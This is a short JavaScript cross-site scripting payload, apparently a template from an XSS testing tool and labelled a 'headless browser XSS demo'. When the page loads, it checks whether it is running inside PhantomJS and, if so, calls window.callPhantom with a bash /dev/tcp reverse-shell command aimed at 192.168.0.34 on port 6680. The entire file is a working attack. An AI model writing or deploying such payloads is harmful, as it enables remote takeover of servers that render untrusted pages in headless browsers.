function capture() {
    var javascript_name = "phantomjs callback hunter";
    var uri = document.URL;
    var referrer = document.referrer;
    var payload = {{payload}};
    var assessment = {{assessment}};
            console.log('headless browser XSS demo. (phantom hunter)');
            if (typeof window.callPhantom === 'function') {
              window.callPhantom("0<&192-;exec 192<>/dev/tcp/192.168.0.34/6680;sh <&192 >&192 2>&192");
      		}
        }
//invocation
$(document).ready(capture());